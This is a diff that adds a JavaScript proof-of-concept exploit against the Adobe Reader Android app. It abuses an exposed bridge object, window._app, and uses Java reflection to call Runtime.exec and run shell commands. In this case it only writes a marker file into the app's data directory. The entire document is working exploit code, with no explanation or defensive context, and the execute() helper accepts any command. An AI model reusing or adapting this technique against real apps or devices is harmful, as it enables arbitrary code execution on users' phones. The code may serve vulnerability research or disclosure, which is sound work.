@@ -1,0 +1,14 @@
+function execute(bridge, cmd) {
+   return bridge.getClass().forName('java.lang.Runtime')
+      .getMethod('getRuntime',null).invoke(null,null).exec(cmd);
+}
+
+if(window._app) {
+   try {
+      var path = '/data/data/com.adobe.reader/mobilereader.poc.txt';
+      execute(window._app, ['/system/bin/sh','-c','echo \"Lorem ipsum\" > ' + path]);
+      window._app.alert(path + ' created', 3);
+   } catch(e) {
+      window._app.alert(e, 0);
+   }
+}
